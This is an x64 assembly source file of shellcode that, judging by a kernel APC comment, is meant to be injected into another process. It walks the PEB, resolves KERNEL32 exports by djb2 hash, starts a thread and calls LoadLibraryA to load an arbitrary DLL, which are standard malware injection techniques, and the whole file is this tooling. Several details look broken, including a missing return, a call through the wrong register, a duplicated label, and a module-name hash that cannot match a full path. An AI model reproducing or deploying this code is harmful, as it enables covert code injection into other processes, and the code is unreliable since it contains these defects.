TITLE LoadLibrary shellcode

; Creates a new thread and loads a library into it

.CODE

; Returns the size of the shellcode
GetShellcodeSize PROC
    xor rax, rax
    mov eax, (shellcode_end - offset RunShellcode)
GetShellcodeSize ENDP

CreateShellcodeThread PROC
    mov rax, rsp
    mov r13, [rsp+8]   ; SystemArgument1, see ntkrla57!KiInitializeUserApc
    and rsp, 0ffffffffffffff00h
    add rsp, 8
    push rax
    
    mov rcx, 6ddb9555h	; djb2("KERNEL32.DLL")
    call get_module_base
    mov r12, rax
    test r12, r12
    je end_create_thread_shellcode

    ; get address of CreateThread
    mov rcx, 7f08f451h ; djb2("CreateThread")
    mov rdx, r12
    call resolve_import
    mov r14, rax
    test r14, r14
    je end_create_thread_shellcode

    ; call CreateThread
    mov rcx, 0 ; lpSecurityAttributes
    mov rdx, 0 ; default stack size
    mov r8, RunShellcode ; starting address
    mov r9, r13 ; passing the path to the dll as an argument
    push rcx    ; thread id
    push rcx    ; default creation flags
    call r14

end_create_thread_shellcode:
    pop rsp
    ret
CreateShellcodeThread ENDP

; the main function: loads a library from a specified path
; 
; rcx - kernel32 base
; rdx - path to dll
RunShellcode PROC
    mov r13, rcx ; path to dll
    
    ; load kernel32
    mov rcx, 6ddb9555h	; djb2("KERNEL32.DLL")
    call get_module_base
    mov r12, rax
    test r12, r12
    cmp rax, 0
    je shellcode_end

    mov rcx, r13
    mov rdx, rax
    call LoadLib    ; load kernel32!LoadLibrary on input

shellcode_end:
    ret
RunShellcode ENDP

; Loads a library from a given path
; 
; rcx - address of path
; rdx - address of kernel32.dll
LoadLib PROC
    mov rbx, rcx
    mov rcx, 5fbff0fbh	; djb2("LoadLibraryA")
    call resolve_import

    cmp rax, 0
    je LoadLib_end

    sub rsp, 16
    mov rcx, rbx
    call rdx
    add rsp, 16
LoadLib_end:
    ret
LoadLib ENDP


; djb2 hash function
; rcx - the address of the string (must be null-terminated)
; rdx - the char size (1 for ascii, 2 for widechar)
djb2:
    push rbx
    push rdi

    mov eax, 5381

hash_loop:
    cmp BYTE PTR [rcx], 0
    je dbj2_end

    mov ebx, eax
    shl eax, 5
    add eax, ebx
    movzx rdi, BYTE PTR [rcx]
    add eax, edi

    add rcx, rdx

    jmp hash_loop

dbj2_end:
    pop rdi
    pop rbx
    ret


; module resolving function
; rcx - module name djb2 hash
get_module_base:
    push rbx

    mov r11, gs:[60h] ; r11 = PEB
    mov r11, [r11+18h] ; r11 = Peb->Ldr

    lea r11, [r11+20h] ; r11 = &PEB_LDR_DATA->InMemoryOrderModuleList
    mov rbx, [r11]

find_module_loop:
    push rcx

    mov rcx, [rbx+50h] ; LDR_DATA_TABLE_ENTRY->FullDllName.Buffer
    mov rdx, 2
    call djb2

    pop rcx

    cmp rax, rcx
    je module_found

    mov rbx, [rbx]

    cmp rbx, r11
    jne find_module_loop

module_not_found:
    mov rax, 0
    jmp return_from_func

module_found:
    mov rax, [rbx+20h]

return_from_func:
    pop rbx
    ret

; import resolving function
; rcx - import name djb2 hash
; rdx - module base address
resolve_import:
    push r11
    push r12
    push r13
    push r14
    push r15
    push rbx

parse_pe_export_headers:
    mov rbx, rdx            ; ImageBase

    movzx rdx, WORD PTR [rbx+3ch]
    add rdx, rbx

    mov edx, DWORD PTR [rdx+88h]
    add rdx, rbx

    mov r11d, [rdx+1ch]    ; AddressOfFunctions
    add r11, rbx

    mov r12d, [rdx+20h]    ; AddressOfNames
    add r12, rbx

    mov r13d, [rdx+24h]    ; AddressOfNameOrdinals
    add r13, rbx

    mov r14d, [rdx+14h]    ; NumberOfFunctions

    mov r15, 0

resolve_import_loop:
    push rcx

    mov ecx, DWORD PTR [r12+r15*4]
    add rcx, rbx
    mov rdx, 1
    call djb2

    pop rcx

    cmp rax, rcx
    je import_found

    inc r15
    cmp r15, r14
    jne resolve_import_loop

    mov rax, 0
    jmp resolve_import_end

import_found:
    movzx rax, WORD PTR [r13+r15*2]
    mov eax, DWORD PTR [r11+rax*4]
    add rax, rbx

resolve_import_end:
    pop rbx
    pop r15
    pop r14
    pop r13
    pop r12
    pop r11
    ret
shellcode_end:

END